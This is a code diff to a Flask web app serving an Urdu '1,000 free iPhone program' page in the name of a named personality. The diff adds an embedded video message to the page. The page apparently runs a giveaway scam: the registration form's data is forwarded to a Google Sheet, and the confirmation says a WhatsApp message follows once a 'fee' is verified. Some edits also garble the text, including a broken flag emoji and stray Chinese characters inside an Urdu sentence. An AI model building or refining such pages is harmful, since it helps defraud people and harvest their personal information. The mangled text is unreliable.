@@ -7,7 +7,7 @@ app = Flask(__name__)
 # ⚠️ یہاں اپنی گوگل ایپ اسکرپٹ (Google Apps Script) کا URL ڈالیں
 GOOGLE_SHEET_SCRIPT_URL = "YOUR_GOOGLE_SCRIPT_URL_HERE"
 
-# الٹرا پریمیم ایچ ٹی ایم ایل ڈیزائن جو اب پائتھن کے اندر ہی سیٹ ہے
+# الٹرا پریمیم ایچ ٹی ایم ایل ڈیزائن بشمول لائیو ویڈیو پلیئر
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ur" dir="rtl">
@@ -57,11 +57,21 @@ HTML_TEMPLATE = """
             </svg>
         </div>
         <h1 class="text-4xl md:text-6xl font-bold text-amber-400 mb-6 urdu-font leading-relaxed">ندیم نانی والا</h1>
-        <h2 class="text-xl md:text-3xl font-semibold text-white">۱,۰۰۰ فری آئی فون پروگرام 🇵🇰</h2>
+        <h2 class="text-xl md:text-3xl font-semibold text-white">۱,۰۰۰ فری آئی فون پروگرام 🇵کینا</h2>
     </header>
 
     <main class="max-w-6xl w-full mx-auto px-4 py-4 grid grid-cols-1 lg:grid-cols-12 gap-8 items-start flex-grow">
         <div class="lg:col-span-5 space-y-6">
+            
+            <div class="glass p-4 rounded-2xl border-2 border-red-500/30 overflow-hidden shadow-xl">
+                <span class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-[11px] font-medium bg-red-500/10 text-red-400 border border-red-500/20 mb-3">
+                    🔴 ندیم نانی والا کا اہم ویڈیو پیغام لازمی دیکھیں
+                </span>
+                <div class="relative pt-[177.77%] w-full rounded-xl overflow-hidden bg-black">
+                    <iframe class="absolute inset-0 w-full h-full" src="YOUR_VIDEO_EMBED_URL" title="Nadeem Nani Wala Video" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+                </div>
+            </div>
+
             <div class="glass p-6 rounded-2xl border border-gray-800 text-center shadow-xl">
                 <div class="scene mb-4">
                     <div class="cube">
@@ -93,7 +103,7 @@ HTML_TEMPLATE = """
             </div>
         </div>
 
-        <div class="lg:col-span-7 bg-gradient-to-b from-gray-1000 to-gray-950 p-6 md:p-8 rounded-2xl border border-gray-800 shadow-2xl">
+        <div class="lg:col-span-7 bg-gradient-to-b from-gray-900 to-gray-950 p-6 md:p-8 rounded-2xl border border-gray-800 shadow-2xl">
             <h3 class="text-xl font-bold text-white mb-6 text-center">آفیشل رجسٹریشن فارم</h3>
             
             <form id="iphoneForm" action="/register" method="POST" class="space-y-5">
@@ -122,7 +132,7 @@ HTML_TEMPLATE = """
                 </div>
 
                 <button type="submit" id="submitBtn" class="w-full bg-amber-500 hover:bg-amber-600 text-black font-bold py-3.5 rounded-xl transition-all shadow-lg text-sm mt-2">
-                    **رجسٹریشن مکمل کریں** 🚀
+                    رجسٹریشن مکمل کریں 🚀
                 </button>
             </form>
 
@@ -150,7 +160,6 @@ HTML_TEMPLATE = """
 
 @app.route('/')
 def home():
-    # سنگل فائل سے ڈائریکٹ ایچ ٹی ایم ایل رینڈر کرنا
     return render_template_string(HTML_TEMPLATE)
 
 @app.route('/register', methods=['POST'])
@@ -166,7 +175,6 @@ def register():
         if not all(user_data.values()):
             return "جانی! تمام معلومات درست درج کریں۔", 400
 
-        # گوگل شیٹ پر ڈیٹا فارورڈ کرنا
         response = requests.post(GOOGLE_SHEET_SCRIPT_URL, data=user_data, timeout=10)
         
         if response.status_code == 200:
@@ -174,7 +182,7 @@ def register():
             <div style="background-color: #05070c; color: white; text-align: center; padding: 50px; font-family: sans-serif; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center;">
                 <h1 style="color: #d4af37;">🎉 رجسٹریشن مکمل ہو گئی!</h1>
                 <p style="font-size: 18px; color: #cbd5e1;">آپ کی معلومات ندیم نانی والا آفیشل لکی ڈرا سسٹم میں جمع ہو چکی ہیں۔</p>
-                <p style="color: #64748b; font-size: 14px;">فیس کی تصدیق کے بعد آپ کو واٹس ایپ پر میسج آ جائے گا۔</p>
+                <p style="color: #64748b; font-size: 14px;">فیس کی تصدیق کے بعد آپ کو واٹس ایپ پر میسج آ جائے打造。</p>
                 <a href="/" style="margin-top: 20px; background-color: #d4af37; color: black; padding: 10px 20px; text-decoration: none; font-weight: bold; border-radius: 8px;">واپس جائیں</a>
             </div>
             """
